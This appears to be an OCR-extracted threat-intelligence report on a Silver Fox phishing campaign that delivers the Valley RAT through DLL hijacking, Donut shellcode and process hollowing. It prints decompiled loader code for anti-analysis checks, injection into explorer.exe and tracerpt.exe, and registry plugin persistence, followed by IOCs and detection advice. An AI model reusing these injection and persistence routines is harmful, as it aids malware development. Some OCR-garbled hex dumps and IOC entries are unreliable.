AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "result=CreateProcessA(Buffer,0,0,0,0,CREATE_SUSPENDED,0,0,&StartupInfo,lpProcessInformation);", "hash": "hash"}
